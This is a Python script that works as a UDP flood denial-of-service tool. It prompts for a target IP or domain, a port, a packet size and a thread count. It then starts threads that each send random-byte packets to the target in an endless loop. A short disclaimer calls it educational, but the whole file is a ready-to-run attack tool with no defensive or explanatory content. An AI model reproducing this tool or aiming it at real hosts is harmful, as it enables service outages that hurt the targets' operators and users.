import os
import sys
import random
import socket
import threading
import ipaddress

# Clear console
os.system('clear' if os.name == 'posix' else 'cls')

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def send_packets(ip, port, packet_size):
    data = random._urandom(packet_size)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip), int(port))
    while True:
        try:
            s.sendto(data, addr)
        except KeyboardInterrupt:
            print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
            sys.exit(0)
        except Exception as e:
            print(f"[!] Error: {e}")
            break

def main():
    print("\n█░█░█▀▄░█▀█      ▀█▀ █▀█ █▀█ █▀ ▀█▀ █▀▀ █▀█")
    print("█▄█░█▄█░█▀▀░ ▀▀▀ ░█░ █▄█ ▀▀█ ▄█ ░█░ ██▄ █▀▄\n")
    print("[Warning] This tool is for educational purposes only. I am not responsible for any damages caused by its misuse. Use it at your own risk!\n")
    
    while True:
        try:
            target = input("[#] Enter target IP or domain: ")
            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print("[!] Invalid input. Please enter a valid target IP or domain.")
        except KeyboardInterrupt:
            print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
            sys.exit(0)
    
    if not is_valid_ipv4(target):
        try:
            ip = socket.gethostbyname(target)
            print(f"[+] Resolved {target} to {ip}")
        except socket.error as e:
            print(f"[!] Error resolving the target: {e}")
            sys.exit(1)
    else:
        ip = target

    while True:
        try:
            port = int(input("[#] Enter target port: "))
            break
        except ValueError:
            print("[!] Invalid input. Please enter a valid integer for the port.")
        except KeyboardInterrupt:
            print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
            sys.exit(0)

    while True:
        try:
            packet_size = int(input("[#] Enter packet size (bytes): "))
            break
        except ValueError:
            print("[!] Invalid input. Please enter a valid integer for the packet size.")
        except KeyboardInterrupt:
            print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
            sys.exit(0)

    while True:
        try:
            threads = int(input("[#] Enter number of threads: "))
            break
        except ValueError:
            print("[!] Invalid input. Please enter a valid integer for the threads.")
        except KeyboardInterrupt:
            print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
            sys.exit(0)

    for _ in range(threads):
        th = threading.Thread(target=send_packets, args=(ip, port, packet_size))
        th.start()

if __name__ == "__main__":
    main()
